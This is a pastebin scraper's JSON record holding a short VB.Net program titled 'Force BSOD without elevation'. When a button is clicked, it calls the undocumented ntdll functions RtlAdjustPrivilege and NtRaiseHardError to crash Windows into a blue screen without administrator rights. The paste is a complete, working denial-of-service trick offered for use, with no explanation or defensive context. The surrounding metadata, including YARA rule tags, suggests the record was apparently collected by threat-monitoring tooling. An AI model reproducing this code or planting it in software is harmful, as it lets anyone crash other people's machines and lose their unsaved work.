{
    "scrape_url": "https://scrape.pastebin.com/api_scrape_item.php?i=510xiLPk",
    "full_url": "https://pastebin.com/510xiLPk",
    "date": "1594903007",
    "key": "510xiLPk",
    "size": 1045,
    "expire": "0",
    "title": "Force BSOD without elevation VB.Net Tecian",
    "syntax": "vbnet",
    "user": "Tecian-Code",
    "filename": "510xiLPk",
    "pasteid": "510xiLPk",
    "pastesite": "pastebin.com",
    "@timestamp": "2020-07-16T12:36:47",
    "MD5": "107525ec60de48c0ef46472262e08d3f",
    "SHA256": "65e6a15092299d3ba34afdcecba03667f74ca8a671045636003add588c0fb9e4",
    "raw_paste": "Imports System.Runtime.InteropServices\r\nPublic Class Form1\r\n\r\n    'DLL Imports\r\n    <DllImport(\"ntdll.dll\")>\r\n    Private Shared Function RtlAdjustPrivilege(ByVal Privilege As Integer, ByVal bEnablePrivilege As Boolean, ByVal IsThreadPrivilege As Boolean, <Out()> ByRef previousValue As Boolean) As UInteger\r\n    End Function\r\n\r\n    <DllImport(\"ntdll.dll\")>\r\n    Private Shared Function NtRaiseHardError(ByVal ErrorStatus As UInteger, ByVal NumberOfParameters As UInteger, ByVal UnicodeStringParameterMask As UInteger, ByVal Parameters As IntPtr, ByVal ValidResponseOption As UInteger, <Out()> ByRef Response As UInteger) As UInteger\r\n    End Function\r\n\r\n    Private STATUS_ASSERTION_FAILURE As UInteger = 3221226528\r\n\r\n    Private Sub btnBSOD_Click(sender As Object, e As EventArgs) Handles btnBSOD.Click\r\n        Dim previousValue As Boolean\r\n        RtlAdjustPrivilege(19, True, False, previousValue)\r\n        Dim Response As UInteger\r\n        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, Response)\r\n    End Sub\r\nEnd Class",
    "YaraRule": [
        "enable_org32",
        "core_keywords"
    ]
}